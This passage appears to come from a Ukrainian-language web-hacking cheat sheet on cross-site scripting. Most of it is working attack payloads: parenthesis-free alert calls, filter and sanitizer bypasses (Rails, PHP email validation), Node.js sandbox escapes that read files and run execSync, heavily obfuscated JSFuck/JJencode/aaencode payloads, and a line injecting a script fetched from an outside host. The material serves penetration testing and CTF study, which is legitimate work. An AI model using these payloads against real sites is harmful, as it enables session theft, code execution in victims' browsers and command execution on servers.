// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Виклик довільної функції (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM уразливості**

Існує **JS code**, який використовує **небезпечні дані, контрольовані атакуючим**, наприклад `location.href`. Атакуючий може використати це для виконання довільного JS коду.\
**Через обсяг пояснення** [**DOM vulnerabilities — його було перенесено на цю сторінку**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

Тут ви знайдете детальне **пояснення, що таке DOM vulnerabilities, як вони провокуються та як їх експлуатувати**.\
Також не забудьте, що **в кінці згаданого посту** ви можете знайти пояснення щодо [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Ескалація Self-XSS

### Cookie XSS

Якщо ви можете викликати XSS, відправивши payload всередині cookie, це зазвичай self-XSS. Однак якщо ви знаходите **уразливий субдомен до XSS**, ви можете зловживати цим XSS, щоб інжектувати cookie для всього домену, змусивши спрацювати cookie XSS на головному домені або інших субдоменах (ті, що вразливі до cookie XSS). Для цього ви можете використати cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Відмінний приклад зловживання цією технікою можна знайти в [**цьому блог-пості**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Можливо, користувач може поділитися своїм профілем з admin, і якщо self XSS знаходиться в профілі користувача, а admin його перегляне, це спровокує вразливість.

### Session Mirroring

Якщо ви знаходите self XSS і сторінка має **session mirroring для адміністраторів** (наприклад, дозволяє клієнтам просити допомогу, і щоб адмін міг допомогти, він бачить те, що ви бачите у вашому session, але з його session), ви можете змусити **administrator** тригернути ваш self XSS і вкрасти його cookies/session.

## Інші обходи

### Обхід санітизації через WASM linear-memory template overwrite

Коли вебдодаток використовує Emscripten/WASM, константні рядки (наприклад, HTML форматні шаблони) живуть у записуваній лінійній пам'яті. Один внутрішньо‑WASM overflow (наприклад, unchecked memcpy в шляху редагування) може пошкодити суміжні структури і перенаправити записи до цих констант. Перезапис шаблону на кшталт "<article><p>%.*s</p></article>" в "<img src=1 onerror=%.*s>" перетворює санітизований ввід у значення JS-обробника і негайно дає DOM XSS при рендері.

Перегляньте присвячену сторінку з workflow експлуатації, DevTools помічниками для пам'яті та захистами:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Нормалізований Unicode

Варто перевірити, чи відображені значення нормалізуються як Unicode на сервері (або на клієнтській стороні) і зловживати цією функціональністю для обходу захистів. [**Приклад знайдете тут**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Через **RoR mass assignment** у HTML вставляються лапки, після чого обмеження на лапки обходиться і додаткові поля (onfocus) можуть бути додані всередину тега.\
Приклад форми ([з цього звіту](https://hackerone.com/reports/709336)), якщо ви надішлете payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Пара "Key","Value" буде виведена так:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Тоді буде вставлено атрибут onfocus, і відбудеться XSS.

### Спеціальні комбінації
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Якщо ви виявите, що можете **inject headers in a 302 Redirect response**, можна спробувати змусити браузер виконати довільний JavaScript. Це **не просто**, оскільки сучасні браузери не інтерпретують HTTP response body якщо HTTP response status code — 302, тож простий cross-site scripting payload марний.

В [**this report**](https://www.gremwell.com/firefox-xss-302) та в [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) можна прочитати, як тестувати різні протоколи всередині Location header і перевірити, чи дозволить якийсь із них браузеру інспектувати та виконати XSS payload всередині body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

Якщо ви можете вказати **callback**, який javascript виконуватиме, обмежений лише цими символами. [**Read this section of this post**](#javascript-function), щоб дізнатися, як зловживати цією поведінкою.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Якщо ви намагаєтеся завантажити скрипт з content-type, наприклад `application/octet-stream`, Chrome видасть таку помилку:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Єдині **Content-Type**s, які дозволять Chrome виконати завантажений скрипт, — це ті, що вказані в const **`kSupportedJavascriptTypes`** у [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Типи скриптів для XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Отже, які типи можуть бути вказані для завантаження скрипту?
```html
<script type="???"></script>
```
Відповідь:

- **module** (за замовчуванням, нічого пояснювати)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles — це функція, яка дозволяє упакувати багато даних (HTML, CSS, JS…) разом у файл **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Дозволяє покращити синтаксис import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Ця поведінка була використана в [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) для перемапінгу бібліотеки на eval; зловживання цим може призвести до XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ця функція в основному покликана вирішити деякі проблеми, спричинені pre-rendering. Працює так:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Веб Content-Types для XSS

(З [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Наступні content types можуть виконувати XSS у всіх браузерах:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

В інших браузерах інші **`Content-Types`** можуть бути використані для виконання довільного JS, див.: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Якщо сторінка повертає content-type text/xml, можна вказати простір імен і виконати довільний JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Спеціальні шаблони заміни

Коли використовується щось на кшталт **`"some {{template}} data".replace("{{template}}", <user_input>)`**, нападник може скористатися [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement), щоб спробувати обійти деякі захисти: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Наприклад, у [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) це було використано, щоб **екранувати JSON-рядок** всередині скрипта і виконати довільний код.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Якщо у вас є лише обмежений набір символів для використання, перегляньте інші робочі рішення для проблем XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Якщо **все undefined** перед виконанням недовіреного коду (як у [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), можна згенерувати корисні об'єкти «з нічого», щоб зловживати виконанням довільного недовіреного коду:

- Використовуючи import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Доступ до `require` опосередковано

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) модулі обгорнуті Node.js у функцію, наприклад, так:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Тому, якщо з цього модуля ми можемо **викликати іншу функцію**, з цієї функції можна використати `arguments.callee.caller.arguments[1]`, щоб отримати доступ до **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Подібно до попереднього прикладу, можна **use error handlers**, щоб отримати доступ до **wrapper** модуля та функції **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Різні obfuscations на одній сторінці:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Більш складний JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
